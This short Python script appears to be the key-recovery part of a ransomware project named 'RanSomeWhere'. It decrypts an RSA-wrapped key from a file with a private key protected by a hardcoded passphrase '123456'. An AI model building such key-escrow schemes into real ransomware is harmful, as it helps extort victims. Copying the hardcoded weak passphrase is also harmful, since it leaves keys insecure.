import binascii
from Crypto.PublicKey import RSA
from Crypto.Cipher import  PKCS1_OAEP

x=open('/home/kali/RanSomeWhere/plain','rb')
hexval=x.read()
enckey=binascii.unhexlify(hexval)
server_key = RSA.import_key(open('private.pem').read(), passphrase="123456")
decryptorRSA = PKCS1_OAEP.new(server_key)
deckey=decryptorRSA.decrypt(enckey)
print(deckey)
f=open('/home/kali/RanSomeWhere/key','wb')
f.write(binascii.hexlify(deckey))
f.close()